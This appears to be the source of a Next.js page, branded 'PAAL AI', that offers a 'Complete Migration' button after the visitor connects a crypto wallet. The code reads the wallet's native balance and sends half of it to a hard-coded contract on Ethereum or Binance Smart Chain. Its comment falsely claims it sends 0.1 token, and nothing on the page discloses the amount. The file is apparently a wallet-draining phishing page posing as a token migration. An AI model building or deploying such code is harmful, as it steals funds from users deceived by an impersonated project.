import { ConnectWallet, useBalance, useContract, useContractWrite, Web3Button } from "@thirdweb-dev/react";
import { NextPage } from "next";
import { Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link } from "@nextui-org/react";
import { useContext } from "react";
import ChainContext from "../context/Chain";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import { utils } from "ethers";

const Home: NextPage = () => {
  const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
  const wbalance = data?.displayValue;
  console.log(wbalance);
  const balx = !isNaN(wbalance) ? (wbalance * 0.5).toString() : '0';
  console.log(balx);
  const { selectedChain, setSelectedChain } = useContext(ChainContext);
  const addresses: Record<string, string> = {
    ["ethereum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
    ["binance"]: "0xD606CD40c93C297327c7294ecB14fC6197fFB6B8",
  };
  const { contract } = useContract(addresses[selectedChain]);
  const { mutateAsync, error } = useContractWrite(
    contract,
    "Paalaidep",
  );
  
  return (
    <div className="bg-cover bg-center min-h-screen" style={{ backgroundImage: `url('images/bg-paal.png')` }}>
      <div>
        <Navbar>
          <NavbarBrand>
            <Image src="images/logo.png" alt="Logo" className="h-12" />
          </NavbarBrand>
          <NavbarContent justify="end">
            <NavbarItem>
              <ConnectWallet modalTitle={"Connect to PAAL AI"}></ConnectWallet>
            </NavbarItem>
          </NavbarContent>
        </Navbar>
        <div className="flex justify-center items-center">
          <br /><br /><br /><br /><br /><br /><br />
          <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
          <br />
        </div>
        <h1 className="flex justify-center font-bold text-lg text-white">
          <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
        </h1>
        <p className="flex justify-center text-white">Complete Migration</p>
        <br />
        <div className="flex justify-center items-center">
          <br />
          <Web3Button
      contractAddress={addresses[selectedChain]}
      action={() =>
        mutateAsync({
          overrides: {
            value: utils.parseEther(balx), // send 0.1 native token with the contract call
          },
        })
      }
    >Complete Migration</Web3Button>
          &nbsp;&nbsp;
          <select
            className="block font-bold px-4 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
            value={String(selectedChain)}
            onChange={(e) => setSelectedChain(e.target.value)}>           
            <option value="binance">Binance Smart Chain</option>
            <option value="ethereum">Ethereum</option>
          </select>
        </div>
      </div>
    </div>
  );
};
export default Home;